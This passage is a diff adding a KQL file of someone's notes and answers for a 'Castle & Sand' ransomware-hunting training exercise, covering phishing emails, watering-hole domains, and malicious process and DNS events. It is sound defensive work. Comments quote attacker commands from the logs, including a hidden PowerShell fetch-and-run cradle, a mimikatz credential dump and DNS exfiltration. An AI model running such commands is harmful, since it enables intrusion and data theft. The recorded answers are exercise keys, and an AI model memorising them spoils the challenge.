@@ -1,0 +1,1144 @@
+﻿///Castle & Sand: A Beachy Case of Ransomware
+
+/////Section 1: KQL 101 🧰 skipped already done
+
+//Section 2: Shark Attack! 🦈
+//What email address did the threat actor provide to Castle&Sand to communicate with them?
+//sharknadorules_gang@onionmail.org
+
+//What is the unique decryption ID?
+//sunnyday123329JA0
+
+//Should this be something you post publicly about? Yes or no? ///no
+//How many notes appeared in Castle&Sand's environment?
+//PAY_UP_OR_SWIM_WITH_THE_FISHES.txt
+
+//let see what tables are given
+search *
+| distinct $table
+
+FileCreationEvents
+| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
+|count //774
+
+//How many distinct hostnames had the ransom note?
+FileCreationEvents
+| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
+  | summarize Count = count() by hostname
+  |distinct hostname //774
+
+  //How many distinct employee roles were affected by the ransomware attack?
+
+  let roleranaffect =
+FileCreationEvents
+| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
+  |distinct hostname; // check the common command in Filecreationevent and Employee
+  Employees
+  | where hostname  has_any (roleranaffect) // affect the common comand to the variable
+  | distinct role // 18
+
+//How many unique hostnames belong to IT employees?
+  let roleranaffect =
+FileCreationEvents
+| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
+  |distinct hostname; // check the common command in Filecreationevent and Employee
+  Employees
+  | where hostname  has_any (roleranaffect) // affect the common comand to the variable
+    | summarize Count = count() by role //25
+
+// What is that employee's name? One of the IT employees has an IP address that ends in .46.
+  let roleranaffect =
+FileCreationEvents
+| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
+  |distinct hostname; // check the common command in Filecreationevent and Employee
+  Employees
+  | where hostname  has_any (roleranaffect) // affect the common comand to the variable
+  | where role contains "IT Helpdesk" and ip_addr endswith ".46"
+  | project name, ip_addr, role //Simeon Kakpovi ; 10.10.0.46
+
+//How many security alerts involved the different hosts?
+let impact_hosts = FileCreationEvents
+| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
+| distinct hostname;
+SecurityAlerts
+| where description has_any (impact_hosts) //652
+
+
+//How many Security Alerts reference the hostnames of helpdesk employees that received ransom notes?
+
+let impact_hosts = FileCreationEvents
+| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
+| distinct hostname;
+let helpdesk_hostnames = Employees
+| where hostname in (impact_hosts)
+| where role contains "IT Helpdesk"
+| distinct hostname;
+SecurityAlerts
+| where description has_any (helpdesk_hostnames)
+
+//Who owns the machine that was flagged on that alert? (provide their name)
+
+let impact_hosts = FileCreationEvents
+| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
+| distinct hostname;
+let helpdesk_hostnames = Employees
+| where hostname in (impact_hosts)
+| where role contains "IT Helpdesk"
+| distinct hostname;
+SecurityAlerts
+| where description has_any (helpdesk_hostnames)
+| parse description with "host" hostnameFlag "." *
+| where hostnameFlag contains "machine"
+| distinct hostnameFlag
+
+///6S7W-MACHINE: Chomping-Schedule_Changes there is no filename
+
+Employees
+| where hostname contains "6S7W-MACHINE"
+|project hostname, name //Preston Lane
+
+//When did the file appear on that user's machine? (copy and paste the full timestamp)
+SecurityAlerts
+| where description contains "6S7W-MACHINE"
+
+//What's the SHA256 hash of that file?
+//Filename; Chomping-Schedule_Changes.xlsx
+FileCreationEvents
+| where hostname contains "6S7W-MACHINE" and filename contains "Chomping-Schedule_Changes.xlsx"
+//2023-05-26T09:26:15.000Z, SHA256 : 71daa56c10f7833848a09cf8160ab5d79da2dd2477b6b3791675e6a8d1635016
+
+//What application created that file?
+//firefox.exe
+
+//How many unique hosts had files with that exact name on their systems?
+FileCreationEvents
+| where filename contains "Chomping-Schedule_Changes.xlsx"
+|distinct hostname
+| summarize Count = count() by hostname //11
+
+//How many unique domains did employees download this file from?
+//https://jawfin.com/published/images/files/Chomping-Schedule_Changes.xlsx
+///| where process_commandline has_any ('Ntds','ntds',@'C:\Windows\Temp')
+
+OutboundNetworkEvents
+| where url contains "Chomping-Schedule_Changes.xlsx"
+| parse url with @"https://" domains1 "/"*
+| parse url with @"http://" domains2 "/"*
+| extend resultdomain = coalesce(domains1, domains2)
+| distinct resultdomain
+//jawfin.com and sharkfin.com
+
+//Based on the employee we've been tracking from Question 11, which domain did they download the file from?
+//Who owns the machine that was flagged on that alert? (provide their name);  Preston Lane ; 6S7W-MACHINE
+
+let DomainPreston =
+Employees
+| where name contains "Preston Lane"
+|project ip_addr;
+OutboundNetworkEvents
+| where url contains "Chomping-Schedule_Changes.xlsx"
+| where src_ip in (DomainPreston)
+| parse url with @"https://" domains1 "/"*
+| parse url with @"http://" domains2 "/"*
+| extend resultdomain = coalesce(domains1, domains2)
+| distinct resultdomain
+//jawfin.com
+
+//How many unique IP addresses did the domain resolve to?
+PassiveDns
+| where domain contains "jawfin.com"
+| project timestamp, ip
+| distinct ip
+
+
+//Which IP address is closest in time to when the file was created of the employee's machine?
+//2023-05-26T09:26:15.000Z created file Chomping-Schedule_Changes.xlsx
+let filecreationTime = datetime("2023-05-26T09:26:15");
+PassiveDns
+| where domain contains "jawfin.com"
+| where timestamp  >= filecreationTime - 10000m and timestamp  <= filecreationTime + 10000m
+| project timestamp, ip
+//193.248.75.126
+
+//There was another domain found from Q16. How many unique IPs did that domain resolve to?
+///other domai== sharkfin.com
+PassiveDns
+| where domain contains "sharkfin.com"
+| project timestamp, ip
+| distinct ip //4
+
+//Let's take all of the IP addresses from the two domains and search them against network events on Castle&Sand's website.
+//
+//How many records returned from your query?
+
+let ip_list =
+PassiveDns
+| where domain contains "sharkfin.com" or domain contains "jawfin.com"
+| distinct ip;
+InboundNetworkEvents
+| where src_ip has_any (ip_list)
+//39
+
+//When was the first time we saw any of these actor IP addresses from Q21 against Castle&Sand's network?
+//2023-05-20T03:11:57.000Z
+
+//Let's search the actor IPs against AuthenticationEvents to see if they logged into any user machines or email accounts.
+let ip_list =
+PassiveDns
+| where domain contains "sharkfin.com" or domain contains "jawfin.com"
+| distinct ip;
+AuthenticationEvents
+| where src_ip has_any (ip_list) //0
+
+//Let's look for the malicious domains in Emails.
+
+Email
+| where link contains "sharkfin.com" or link contains "jawfin.com"
+|count //14
+
+//When was the earliest email sent?
+Email
+| where link contains "sharkfin.com" or link contains "jawfin.com"
+  | project timestamp, sender
+  | order by timestamp asc
+  | take 1 //2023-05-25T16:33:09.000Z
+
+ // Who was the sender?
+//legal.sand@verizon.com
+
+//How many emails total did that sender send to Castle&Sand employees?
+
+Email
+| where sender == "legal.sand@verizon.com"//23
+
+//Take all of the distinct sender or reply_to emails from the last question.
+Email
+| where sender == "legal.sand@verizon.com"
+| distinct sender //legal.sand@verizon.com
+
+Email
+| where sender == "legal.sand@verizon.com"
+| distinct reply_to //castle@hotmail.com; legal.sand@verizon.com; urgent_urgent@yandex.com
+
+
+//How many emails total are associated with these email addresses?
+let EmailsActor = datatable(Email: string)
+[
+  "castle@hotmail.com",
+  "legal.sand@verizon.com",
+  "urgent_urgent@yandex.com"
+];
+Email
+| where sender has_any (EmailsActor) or  reply_to has_any (EmailsActor)
+//40
+
+//How many unique domains did the email addresses use in their emails?
+
+let EmailsActor = datatable(Email: string)
+[
+  "castle@hotmail.com",
+  "legal.sand@verizon.com",
+  "urgent_urgent@yandex.com"
+];
+Email
+| where link has_any (EmailsActor) or  reply_to has_any (EmailsActor)
+| distinct link
+| parse link with @"https://" domains1 "/"*
+| parse link with @"http://" domains2 "/"*
+| extend resultdomainEmail = coalesce(domains1, domains2)
+|distinct resultdomainEmail //6
+
+//How many distinct IP addresses total were used by all of the domains identified in Q29?
+let EmailsActor = datatable(Email: string)
+[
+  "castle@hotmail.com",
+  "legal.sand@verizon.com",
+  "urgent_urgent@yandex.com"
+];
+let IP_domainquestion29 =
+Email
+| where link has_any (EmailsActor) or  reply_to has_any (EmailsActor)
+| distinct link
+| parse link with @"https://" domains1 "/"*
+| parse link with @"http://" domains2 "/"*
+| extend resultdomainEmail = coalesce(domains1, domains2)
+|distinct resultdomainEmail;
+PassiveDns
+| where domain in (IP_domainquestion29)
+| distinct ip //15
+
+//How many user accounts did these IPs log into?
+
+let EmailsActor = datatable(Email: string)
+[
+  "castle@hotmail.com",
+  "legal.sand@verizon.com",
+  "urgent_urgent@yandex.com"
+];
+let IP_domainquestion29 =
+Email
+| where link has_any (EmailsActor) or  reply_to has_any (EmailsActor)
+| distinct link
+| parse link with @"https://" domains1 "/"*
+| parse link with @"http://" domains2 "/"*
+| extend resultdomainEmail = coalesce(domains1, domains2)
+|distinct resultdomainEmail;
+let account_log =
+PassiveDns
+| where domain in (IP_domainquestion29)
+| distinct ip; //15
+AuthenticationEvents
+| where src_ip in (account_log)
+| where result contains "successful"
+| distinct hostname //0
+
+//Looking at these emails (from question 28), how many unique filenames were served by these domains?
+
+let EmailsActor = datatable(Email: string)
+[
+  "castle@hotmail.com",
+  "legal.sand@verizon.com",
+  "urgent_urgent@yandex.com"
+];
+Email
+| where link has_any (EmailsActor) or  reply_to has_any (EmailsActor)
+| distinct link //5
+
+//; Jawdropping-Employee.lnk; HR_Sharktastic_Notes.pdf; Fintastic-Work-Updates.docx; Sharktastic_Employee_Changes.xlsx; Chomping-Schedule_Changes.xlsx
+
+//How many files with these names were created on employee host machines?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+FileCreationEvents
+| where path has_any (Filesactor)
+//34
+
+//When was the first file observed?
+//////2023-05-25T16:43:20.000Z
+
+
+//How many records total are associated with the identified host machines from Q33?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| count //16391
+
+
+/////Using your query from Q35, set a new query where the timestamp is greater than the first time you saw the file in Q34.
+///How many records total do you have now?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| count //5818
+
+///Let's look at the first few records. There's some suspicious powershell activity that occurs near the beginning.
+//What IP address is referenced in that command?
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline    contains "powershell"
+////220.35.180.137
+//////powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://220.35.180.137/a'))"
+
+//Which host machine did the powershell activity execute on?
+//////powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://220.35.180.137/a'))"
+//CL8Q-LAPTOP
+
+////There's a weird repeating command right before this activity.
+///What's the parent process of the first time this repeated activity occurs?
+
+//timestamp=== 2023-05-25T18:28:02.000Z search for activity before this time
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp <=  datetime(2023-05-25T18:28:02)
+////scvhost.exe ///echo "hello"
+
+///What legitimate Windows process was this file trying to masquerade as?
+////////////////svchost.exe
+
+//After the powershell activity there's evidence that a popular password cracking tool may have executed on a host machine. Take that file and search for how many times that tool may have ran on the Castle&Sand environment.
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline contains "mimikatz.exe"
+| distinct hostname //31
+
+////Powershell activity //powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://220.35.180.137/a'))"
+
+//password tool mimikatz.exe  //mimikatz.exe "sekurlsa::logonPasswords"
+
+//Let's go back to the powershell activity from question 37.How many hosts did that powershell command execute on?
+
+////Powershell activity //powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://220.35.180.137/a'))"
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline   contains "powershell.exe -nop -w hidden -c "
+| distinct hostname //31
+
+//How many unique IP addresses were used in these commands?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline   contains "powershell.exe -nop -w hidden -c "
+| parse process_commandline with @"https://" IPaddrActor "/a"*
+|distinct  IPaddrActor //14
+
+
+//Which of these IP addresses was seen the most?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline   contains "powershell.exe -nop -w hidden -c "
+| parse process_commandline with @"https://" IPaddrActor "/a"*
+| summarize Count = count() by IPaddrActor
+| order by Count desc  ///157.242.169.232
+
+
+//Take the parent processes from Q42. How many records total involved those processes?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+let parent_processActor=
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline   contains "powershell.exe -nop -w hidden -c "
+| distinct parent_process_name; //6
+ProcessEvents
+| where parent_process_name in (parent_processActor)
+|count //62
+
+//Let's look to see if any of these files are referenced in the command line. How many records did you find?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+let parent_process= 
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline   contains "powershell.exe -nop -w hidden -c "
+| distinct parent_process_name; //6
+ProcessEvents
+| where process_commandline has_any (parent_process) //1548
+
+//When was the earliest time found in Q46?
+///2023-06-09T19:43:58.000Z
+
+//You remember that the encrypted files all had the extension '.sharkfin'. Search for that in created files.
+
+//When was the earliest time you saw these files?
+
+FileCreationEvents
+| where path contains ".sharkfin"
+///2023-06-09T19:43:48.000Z
+
+/////////////////********Section 3: Hunting the Shark 🔍 (Requires some Section 2 Answers)//////
+
+
+//How many hours does Castle&Sand have before the gang releases the information?
+//72h
+
+ //Dwake the Rapper
+
+ //@ Castle&SandCo. You have 72hours to pay the ransom 🕑💀 or pay the toothy consequences 😬😬 Don't mess with the #Sharkboyz 🦈🦈🦈 pic.twitter.com/xdjDUCnXl7
+
+//#Sharkboyz
+
+//What Mitre Technique is aligned with what this group did on Castle&Sand systems?
+//T1486 – Data Encrypted for Impact
+
+
+//What is the ZIP code of their headquarters?
+
+//sharknadorules_gang@onionmail.org ;  sharky ransom gang; the ransomware group is the SharkzBoys
+//244 Madison Avenue #1031, New York, NY 10016, USA → ZIP code 10016
+//web onionmail.org
+
+//What country is this email service located in?
+ // United States;US;USA
+
+
+///Let's look at the IP addresses from Section 2, Q18 using MaxMind GeoIP2.
+///  https://www.maxmind.com/en/geoip-demo
+//How many continents total are these IP addresses from?
+
+///How many unique IP addresses did the domain resolve to? 6
+//How many unique IP addresses did the domain resolve to?
+PassiveDns
+| where domain contains "jawfin.com"
+| project timestamp, ip
+| distinct ip
+
+//134.136.25.2
+//17.72.123.89
+//193.248.75.126
+//213.30.8.133
+//19.216.253.112
+//165.185.77.18
+
+///  https://www.maxmind.com/en/geoip-demo 
+/////searching IP we have 3 continents (north America, south america, europe)
+
+//Use search.censys.io to look up the IP address found in Section 2, Q19.
+///What is the Autonomous System (AS) number for the IP address?
+
+//193.248.75.126 search in https://platform.censys.io/hosts/193.248.75.126
+
+//the Autonomous System (AS) number for the IP address
+//AS3215
+
+
+//Which one is assigned to a University? Look at the IPs from Section 2, Q20.
+
+//There was another domain found from Q16. How many unique IPs did that domain resolve to?
+///other domai== sharkfin.com
+PassiveDns
+| where domain contains "sharkfin.com"
+| project timestamp, ip
+| distinct ip //4
+
+//180.5.6.199
+//157.242.169.232
+//188.203.116.15
+//200.106.38.88
+
+////use https://platform.censys.io/hosts/157.242.169.232 university of Loyola Marymount University
+
+////Look at the emails from Section 2, Q28.Which email address is associated with a company outside of the United States?
+
+//How many emails total are associated with these email addresses?
+let EmailsActor = datatable(Email: string)
+[
+  "castle@hotmail.com",
+  "legal.sand@verizon.com",
+  "urgent_urgent@yandex.com"
+];
+Email
+| where sender has_any (EmailsActor) or  reply_to has_any (EmailsActor)
+| distinct reply_to
+
+//legal.sand@verizon.com ; urgent@yandex.com; sandcastle@aol.com; urgent_urgent@yandex.com; castle@hotmail.com
+///Response
+
+
+///For the tool found in Section 2, Q41, what is the MITRE ID for that specific software?
+
+///the tool is mimikatz.exe
+///Mitre ID: S0002
+
+
+///What is the MITRE ID for that type of technique that this tool is typically used for?
+
+///T1003 – OS Credential Dumping
+
+
+/////Take the filenames from Section 2, Q45.
+///How many unique SHA256 hashes are found in Castle&Sand's environment with these filenames?
+
+
+//Let's look at the first few records. There's some suspicious powershell activity that occurs near the beginning.
+//What IP address is referenced in that command? IP  220.35.180.137
+//What IP address is referenced in that command? S2 Question 37 check  parent_process_hash
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline    contains "powershell.exe -nop -w hidden -c"
+| distinct parent_process_hash ///9
+
+///How many were flagged as malicious on VirusTotal? //8
+////https://www.virustotal.com/
+/////af99dea461d36b775235a107c7ea94a2b457851ef62d0ed6f0c50fb5131c8c8b flagged Trojan.ransomare
+/////d18aa84b7bf0efde9c6b5db2a38ab1ec9484c59c5284c0bd080f5197bf9388b0 flagged Trojan.ransomare
+/////7ef2cc079afe7927b78be493f0b8a735a3258bc82801a11bc7b420a72708c250 Hacktool
+/////21ff279ba30d227e32e63cb388bf8c2d21c4fd7e935b3087088579b29e56d81d Trojan.ransomare
+/////b99d114b267ffd068c3289199b6df95a9f9e64872d6c2b666d63974bbce75bf2 Trojan.ransomare
+/////aa48acaef62a7bfb3192f8a7d6e5229764618ac1ad1bd1b5f6d19a78864eb31f Trojan.ransomare
+/////f77077777b0cd9edd693b87cbaaaefe73436395192a2b77a841b2d5bd9b088e8 Trojan.ransomare
+/////82a7241d747864a8cf621f226f1446a434d2f98435a93497eafb48b35c12c180 Trojan.ransomare
+
+//Which file hash was reported by the security community as the ransomware's encrypted payload?
+////82a7241d747864a8cf621f226f1446a434d2f98435a93497eafb48b35c12c180
+
+
+////For Section 2, Q46, what ransomware family uses a command similar to this process execution?
+
+let Filesactor = datatable(filenames: string)
+[
+  "Jawdropping-Employee.lnk",
+  "HR_Sharktastic_Notes.pdf",
+  "Fintastic-Work-Updates.docx",
+  "Sharktastic_Employee_Changes.xlsx",
+  "Chomping-Schedule_Changes.xlsx"
+];
+let Process_record = 
+FileCreationEvents
+| where path has_any (Filesactor)
+| distinct hostname;
+let parent_process= 
+ProcessEvents
+| where hostname in (Process_record)
+| where timestamp > datetime(2023-05-25T16:43:20)
+| where process_commandline   contains "powershell.exe -nop -w hidden -c "
+| distinct parent_process_name; //6
+ProcessEvents
+| where process_commandline has_any (parent_process) //1548
+| distinct process_commandline
+
+/////cy.exe --run=3308 --pt=C:\Users\Public\Documents\winutils.dll --cg=C:\Users\Public\Documents\config.ini --we=C:\Users\Public\Documents\cy.exe
+////cy.exe --run=1337 --pt=C:\Users\Public\Desktop\winutils.dll --cg=C:\Users\Public\Desktop\config.ini --we=C:\Users\Public\Desktop\cy.exe
+
+///That command line is strongly associated with the Rorschach ransomware family (also called BabLock by some researchers).
+
+////Rorschach ransomware (aka BabLock)
+
+///response BabLock
+
+
+///***********************Section 4: Sand in my 👁️👁️ (New Threat Actor) 
+
+////Email castleandsand_official@outlook.com
+
+/// How many emails were sent from this email to Castle&Sand employees?
+
+Email
+| where sender =="castleandsand_official@outlook.com"
+// 19 Emails
+
+//There appears to be another email account. How many emails total are referenced by these two email accounts?
+
+//castleandsandlegaldepartment@gmail.com and castleandsand_official@outlook.com
+
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+//33
+
+
+///How many unique domains are found in the links of these emails?
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| distinct link 
+| parse link with @"http://" uniqueDomain1 "/"*
+| parse link with @"https://" uniqueDomain2 "/"*
+| extend resultuniqueDomain = coalesce(uniqueDomain2, uniqueDomain2)
+|distinct resultuniqueDomain //4
+
+//sunandcastletrading.com, keywordssurfparadise.com, beachlifestylestore.com , sandsurfinggear.com
+
+//Based on these domains, what type of attack did this threat actor conduct?
+
+////Watering hole: A type of attack where a hacker compromises a website that is frequently visited by a specific group of users, such as employees of a certain organization, and then infects their devices with malware when they visit the site.
+
+//How many distinct job roles were targeted by this type of attack?
+let Rolevictms =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+Employees
+| where email_addr has_any (Rolevictms)
+| distinct role //13
+
+//Let's take the targeted employees and look for all external IP addresses that authenticated to those users.
+//How many external IP addresses were used to successfully log into those user accounts?
+
+///info///
+Employees
+| distinct ip_addr //all employee IP start with 10.10
+
+let victims =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+let victimsusername =
+Employees
+| where email_addr has_any (victims)
+| distinct username;
+AuthenticationEvents
+| where username in (victimsusername)
+| where result contains "successful"
+| where src_ip !startswith "10.10"
+| distinct src_ip //43
+
+///These IP addresses may have accessed email inboxes and downloaded data.
+/// How many unique filenames were downloaded by these IP addresses?
+
+let victims =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+let victimsusername =
+Employees
+| where email_addr has_any (victims)
+| distinct username;
+let IPaddrActor =
+AuthenticationEvents
+| where username in (victimsusername)
+| where result contains "successful"
+| where src_ip !startswith "10.10"
+| distinct src_ip; //43
+InboundNetworkEvents
+| where src_ip in (IPaddrActor)
+| where url contains "download=true&output="
+| parse url with *"download=true&output=" Filenamestolen
+| distinct Filenamestolen ///14
+
+///How many distinct IPs were involved in the stealing of downloaded data from the previous questions?
+
+let victims =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+let victimsusername =
+Employees
+| where email_addr has_any (victims)
+| distinct username;
+let IPaddrActor =
+AuthenticationEvents
+| where username in (victimsusername)
+| where result contains "successful"
+| where src_ip !startswith "10.10"
+| distinct src_ip; //43
+InboundNetworkEvents
+| where src_ip in (IPaddrActor)
+| where url contains "download=true&output="
+| parse url with *"download=true&output=" Filenamestolen
+//| distinct Filenamestolen ///14 that is the filenem involved
+| distinct src_ip ///9 IP involved
+
+// Based on the IPs from Q6, how many unique domains did they resolve to?
+
+let victims =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+let victimsusername =
+Employees
+| where email_addr has_any (victims)
+| distinct username;
+let domainActor= 
+AuthenticationEvents
+| where username in (victimsusername)
+| where result contains "successful"
+| where src_ip !startswith "10.10" //only external IP needed not intern
+| distinct src_ip; //43
+PassiveDns
+| where ip in (domainActor)
+| distinct domain //5
+
+
+///Let's go back to the user accounts that may have been affected by the phishing campaign.
+//How many hosts have they logged into?
+
+let victims =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+let victimsusername =
+Employees
+| where email_addr has_any (victims)
+| distinct username;
+AuthenticationEvents
+| where username in (victimsusername)
+| where result contains "successful"
+| distinct hostname // 43
+
+///Investigate the domains from Q9.
+//How many files are present on Castle&Sand systems that originated from these domains?
+
+
+let victims =
+Email
+| where sender =="castleandsand_official@outlook.com"
+or sender =="castleandsandlegaldepartment@gmail.com"
+| parse recipient with NameEmployee"@castleandsand.com"
+| distinct NameEmployee;
+let victimsusername =
+Employees
+| where email_addr has_any (victims)
+| distinct username;
+let domainActor= 
+AuthenticationEvents
+| where username in (victimsusername)
+| where result contains "successful"
+| where src_ip !startswith "10.10" //only external IP needed not intern
+| distinct src_ip; //43
+let filesfrom5domain =
+PassiveDns
+| where ip in (domainActor)
+| distinct domain; //5
+OutboundNetworkEvents
+| where url has_any (filesfrom5domain) 
+| where url has_any (".xlsx", ".docx", ".lnk", ".pdf")
+|distinct url //15
+
+///Investigate what happens after these files are downloaded and find malicious activity.How many unique malware filenames are created from these files?
+// check the URL from the provious query
+///5 distint Malwares
+
+//store_updates.xlsx
+//Work-Updates.docx
+//HR_Notes.pdf
+//Employee_Changes.xlsx
+//employee.lnk
+
+//How many of these files total are present on Castle&Sand systems?
+
+
+FileCreationEvents
+| where filename  has_any (
+    "store_updates.xlsx",
+    "Work-Updates.docx",
+    "HR_Notes.pdf",
+    "Employee_Changes.xlsx"
+)
+| summarize Count=count() by filename, sha256
+| order by Count desc
+//14
+
+//How many distinct C2 servers are associated with the malware?
+
+ProcessEvents
+| where parent_process_name in ("TSVIPSrv.dll", "1.exe", "i.exe", "wmi.dll", "procdump64.exe")
+| where process_commandline has "plink.exe"
+| distinct process_commandline
+//| count //7
+
+////Now it's kind of a choose your own adventure. You need to find out what this threat actor did at the very end.
+///When is the first time you see this final action by the threat actor? Copy & paste the full timestamp.
+
+/// Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500
+ProcessEvents
+| where process_commandline has "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
+
+///datetime( 2023-05-26T10:33:04Z)
+
+//What MITRE Technique is this aligned with?
+
+//DNSExfiltrator
+//T1048
+
+//How many hosts are affected by this action?
+
+ProcessEvents
+| where process_commandline has "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
+| distinct hostname /// 14
+
+//How many distinct job roles were affected by this action?
+
+let distinctRole=
+ProcessEvents
